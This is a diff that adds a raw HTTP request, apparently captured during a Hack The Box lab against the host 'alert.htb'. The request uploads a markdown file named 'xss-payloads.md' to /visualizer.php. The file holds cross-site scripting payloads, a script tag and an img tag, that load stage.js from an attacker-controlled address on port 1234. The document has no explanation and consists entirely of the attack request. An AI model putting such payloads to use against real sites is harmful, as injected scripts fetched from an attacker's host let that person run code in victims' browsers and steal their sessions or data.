@@ -1,0 +1,24 @@
+POST /visualizer.php HTTP/1.1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.6613.120 Safari/537.36
+Accept-Encoding: gzip, deflate, br
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Connection: keep-alive
+Host: alert.htb
+Cache-Control: max-age=0
+Accept-Language: en-US,en;q=0.9
+Upgrade-Insecure-Requests: 1
+Origin: http://alert.htb
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryB5gRHoqhMqRdZlXp
+Referer: http://alert.htb/index.php?page=alert
+Content-Length: 373
+
+------WebKitFormBoundaryB5gRHoqhMqRdZlXp
+Content-Disposition: form-data; name="file"; filename="xss-payloads.md"
+Content-Type: text/markdown
+
+
+    
+    <script src="http://10.10.14.32:1234/stage.js?payload_from_script_tag"></script>
+    
+    <img src="http://10.10.14.32:1234/stage.js?payload_from_uploaded_file_img_tag" />
+------WebKitFormBoundaryB5gRHoqhMqRdZlXp--
